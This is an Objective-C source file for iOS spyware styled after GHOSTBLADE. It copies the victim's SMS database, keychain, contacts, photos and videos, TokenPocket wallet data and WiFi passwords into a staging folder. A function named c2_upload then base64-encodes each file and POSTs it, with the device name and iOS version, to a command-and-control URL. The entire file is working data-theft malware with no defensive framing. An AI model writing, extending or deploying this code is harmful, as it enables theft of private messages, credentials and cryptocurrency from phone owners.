//
//  collector.m — 数据采集 (GHOSTBLADE 风格)
//  目标: SMS, 照片, 通讯录, Keychain, TP walletdb
//

#import <Foundation/Foundation.h>
#include <objc/runtime.h>
#include "collector.h"

#define LOG(fmt, ...) NSLog(@"[COLLECT] " fmt, ##__VA_ARGS__)

// 复制单个文件到采集目录
static void copy_file(NSString *src, NSString *dst_dir, NSString *tag) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:src]) return;
    NSData *data = [NSData dataWithContentsOfFile:src];
    if (!data) return;
    NSString *dst = [dst_dir stringByAppendingPathComponent:
        [NSString stringWithFormat:@"%@_%@", tag, [src lastPathComponent]]];
    [data writeToFile:dst atomically:YES];
    LOG(@"[%@] %@ (%lu bytes)", tag, [src lastPathComponent],
        (unsigned long)data.length);
}

// 递归遍历目录
static void walk_dir(NSString *dir, NSMutableArray<NSString *> *files, int depth) {
    if (depth > 5) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *item in [fm contentsOfDirectoryAtPath:dir error:nil]) {
        NSString *full = [dir stringByAppendingPathComponent:item];
        NSDictionary *attr = [fm attributesOfItemAtPath:full error:nil];
        if (!attr) continue;
        if ([attr[NSFileType] isEqual:NSFileTypeDirectory])
            walk_dir(full, files, depth+1);
        else if ([attr[NSFileSize] longLongValue] < 100*1024*1024)
            [files addObject:full];
    }
}

int collector_run(const char *dir_c) {
    NSString *d = [NSString stringWithUTF8String:dir_c];
    [[NSFileManager defaultManager] createDirectoryAtPath:d
        withIntermediateDirectories:YES attributes:nil error:nil];

    LOG(@"=== Collection Start ===");

    // 1. SMS
    copy_file(@"/var/mobile/Library/SMS/sms.db", d, @"sms");

    // 2. Keychain
    copy_file(@"/private/var/Keychains/keychain-2.db", d, @"keychain");

    // 3. AddressBook
    NSString *ab = @"/var/mobile/Library/AddressBook";
    if ([[NSFileManager defaultManager] fileExistsAtPath:ab]) {
        NSMutableArray *fs = [NSMutableArray array];
        walk_dir(ab, fs, 3);
        for (NSString *f in fs) copy_file(f, d, @"contact");
    }

    // 4. Photos metadata
    NSString *dcim = @"/var/mobile/Media/DCIM";
    if ([[NSFileManager defaultManager] fileExistsAtPath:dcim]) {
        NSMutableArray *fs = [NSMutableArray array];
        walk_dir(dcim, fs, 4);
        for (NSString *f in fs) {
            NSString *ext = [[f pathExtension] lowercaseString];
            if ([@[@"jpg",@"jpeg",@"png",@"heic",@"mov",@"mp4"] containsObject:ext])
                copy_file(f, d, @"photo");
        }
    }

    // 5. TokenPocket wallet data
    NSString *appDir = @"/var/mobile/Containers/Data/Application";
    if ([[NSFileManager defaultManager] fileExistsAtPath:appDir]) {
        for (NSString *uuid in [fm contentsOfDirectoryAtPath:appDir error:nil]) {
            NSString *meta = [NSString stringWithFormat:
                @"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
                appDir, uuid];
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:meta];
            if ([[plist[@"MCMMetadataIdentifier"] description]
                 containsString:@"com.global.wallet"]) {
                NSString *tp = [NSString stringWithFormat:@"%@/%@", appDir, uuid];
                NSMutableArray *fs = [NSMutableArray array];
                walk_dir(tp, fs, 5);
                for (NSString *f in fs) copy_file(f, d, @"tp_wallet");
                LOG(@"Found TP: %@", tp);
            }
        }
    }

    // 6. App Group shared data
    NSString *groupDir = @"/var/mobile/Containers/Shared/AppGroup";
    if ([[NSFileManager defaultManager] fileExistsAtPath:groupDir]) {
        for (NSString *uuid in [fm contentsOfDirectoryAtPath:groupDir error:nil]) {
            NSString *meta = [NSString stringWithFormat:
                @"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
                groupDir, uuid];
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:meta];
            if ([[plist[@"MCMMetadataIdentifier"] description]
                 containsString:@"tp.wallet"]) {
                NSString *gp = [NSString stringWithFormat:@"%@/%@", groupDir, uuid];
                NSMutableArray *fs = [NSMutableArray array];
                walk_dir(gp, fs, 5);
                for (NSString *f in fs) copy_file(f, d, @"tp_group");
                LOG(@"Found TP Group: %@", gp);
            }
        }
    }

    // 7. WiFi passwords
    copy_file(@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
              d, @"wifi");

    LOG(@"=== Collection Complete ===");
    return 1;
}

bool c2_upload(const char *dir_c, const char *url_c) {
    NSString *d = [NSString stringWithUTF8String:dir_c];
    NSString *url = [NSString stringWithUTF8String:url_c];
    NSFileManager *fm = [NSFileManager defaultManager];
    int ok = 0, total = 0;

    for (NSString *f in [fm enumeratorAtPath:d]) {
        NSString *fp = [d stringByAppendingPathComponent:f];
        BOOL isDir; if (![fm fileExistsAtPath:fp isDirectory:&isDir] || isDir) continue;
        NSData *data = [NSData dataWithContentsOfFile:fp];
        if (!data) continue;
        total++;

        NSString *b64 = [data base64EncodedStringWithOptions:0];
        NSDictionary *payload = @{
            @"file": f,
            @"data": b64,
            @"device": [UIDevice currentDevice].name,
            @"ios": [UIDevice currentDevice].systemVersion,
        };
        NSMutableURLRequest *req = [NSMutableURLRequest
            requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        req.HTTPBody = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        req.timeoutInterval = 120;

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        [[[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                if (!e) ok++;
                dispatch_semaphore_signal(sem);
            }] resume];
        dispatch_semaphore_wait(sem,
            dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));
    }
    LOG(@"Upload: %d/%d files sent", ok, total);
    return ok > 0;
}
